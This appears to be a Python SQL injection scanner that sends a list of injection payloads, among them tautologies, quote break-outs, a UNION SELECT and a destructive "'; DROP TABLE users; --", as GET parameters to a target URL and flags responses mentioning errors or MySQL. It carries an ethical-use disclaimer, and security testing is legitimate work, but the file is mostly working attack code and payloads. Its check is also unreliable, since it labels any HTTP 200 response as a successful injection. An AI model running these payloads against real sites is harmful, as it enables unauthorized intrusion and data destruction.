"""
SQL Injection Testing Script (Basic Scanner)

This script performs basic SQL injection tests against a given URL by appending 
common SQL payloads to the query parameters. It simulates malicious input in 
order to identify potential vulnerabilities.

⚠️ Disclaimer: This script is for **educational and ethical testing purposes only**.
Use it only on websites or environments that you own or have explicit permission to test.

How it works:
-------------
1. A list of common SQL injection payloads is defined.
2. For each payload, a GET request is sent to the target URL with the payload in a query parameter (e.g., ?id=...).
3. The script checks the HTTP response for signs of SQL errors or exposure.

Author: Bar Cohen
"""

import requests

# A sample list of SQL injection payloads (could also be loaded from a file)
# Add all the provided logic-based SQL injection payloads into the script

sql_injections = [
    # Logical true conditions
    "true", "1", "1>0", "2-1", "0+1", "1*1", "1%2", "1 & 1", "1&1", "1 && 2", "1&&2",
    "-1 || 1", "-1||1", "-1 oR 1=1", "1 aND 1=1", "(1)oR(1=1)", "(1)aND(1=1)",
    "-1/**/oR/**/1=1", "1/**/aND/**/1=1",

    # Single quote injections
    "1'", "1'>'0", "2'-'1", "0'+'1", "1'*'1", "1'%'2", "1'&'1'='1", "1'&&'2'='1",
    "-1'||'1'='1", "-1'oR'1'='1", "1'aND'1'='1",

    # Double quote injections
    '1"', '1">"0', '2"-"1', '0"+"1', '1"*"1', '1"%"2', '1"&"1"="1', '1"&&"2"="1',
    '-1"||"1"="1', '-1"oR"1"="1', '1"aND"1"="1',

    # Backtick injections
    "1`", "1`>`0", "2`-`1", "0`+`1", "1`*`1", "1`%`2", "1`&`1`=`1", "1`&&`2`=`1",
    "-1`||`1`=`1", "-1`oR`1`=`1", "1`aND`1`=`1",

    # Mixed bracket and quote styles
    "1')>('0", "2')-('1", "0')+('1", "1')*('1", "1')%('2", "1')&'1'=('1", "1')&&'1'=('1",
    "-1')||'1'=('1", "-1')oR'1'=('1", "1')aND'1'=('1",

    '1")>("0', '2")-("1', '0")+("1', '1")*("1', '1")%("2', '1")&"1"=("1',
    '1")&&"1"=("1', '-1")||"1"=("1', '-1")oR"1"=("1', '1")aND"1"=("1',

    "1`)>(`0", "2`)-(`1", "0`)+(`1", "1`)*(`1", "1`)%(`2", "1`)&`1`=(`1", "1`)&&`1`=(`1",
    "-1`)||`1`=(`1", "-1`)oR`1`=(`1", "1`)aND`1`=(`1",

    # Classic payloads
    "' OR '1'='1", "'; DROP TABLE users; --", "-- UNION SELECT * FROM users 1",
]

# Function to send requests and inspect responses
def test_sql_injection(url, injection):
    vulnerable_url = f"{url}?id={injection}"

    try:
        response = requests.get(vulnerable_url)

        if response.status_code == 200:
            print(f"[+] SQL Injection test succeeded for: {injection}")
            return response.text
        else:
            print(f"[-] Request failed for: {injection}")
    except Exception as e:
        print(f"[!] Error during test with injection {injection}: {e}")
    return None

# Function to test a website against all known payloads
def check_website_for_sql_injection(url):
    for injection in sql_injections:
        print(f"\n[•] Testing URL: {url} with injection: {injection}")
        response = test_sql_injection(url, injection)

        if response:
            if "error" in response.lower() or "mysql" in response.lower():
                print(f"[!] Possible SQL Injection vulnerability found at: {url}")
                print("[Response snippet]:")
                print(response[:300])  # print a short preview of the response
                break

# Example usage (replace with a real, testable URL)
url = "http://example.com/product"
check_website_for_sql_injection(url)
